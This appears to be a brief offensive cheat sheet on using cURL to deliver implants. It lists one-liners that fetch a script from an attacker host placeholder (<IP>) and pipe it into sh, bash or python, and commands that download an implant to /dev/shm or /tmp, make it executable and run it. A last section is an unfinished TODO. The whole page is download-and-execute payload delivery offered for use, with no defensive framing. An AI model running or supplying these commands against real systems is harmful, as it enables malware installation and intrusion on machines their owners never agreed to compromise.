# cURL

## 01 - Fileless code execution

```
$ curl http[s]://<IP>/implant.sh | sh

$ curl http[s]://<IP>/implant.sh | bash

$ curl http[s]://<IP>/implant.py | python
```

## 02 - Dropping on memory

Download implant and execute it.

```
$ curl -o /dev/shm/implant http[s]://<IP>/implant && chmod +x /dev/shm/implant && /dev/shm/implant
```

## 03 - Dropping on disk

Download implant and execute it.

```
$ curl -o /tmp/implant http[s]://<IP>/implant && chmod +x /tmp/implant && /tmp/implant
```

## 03 - Compiled After Delivery

TODO: Fill this info

```
$ gcc
```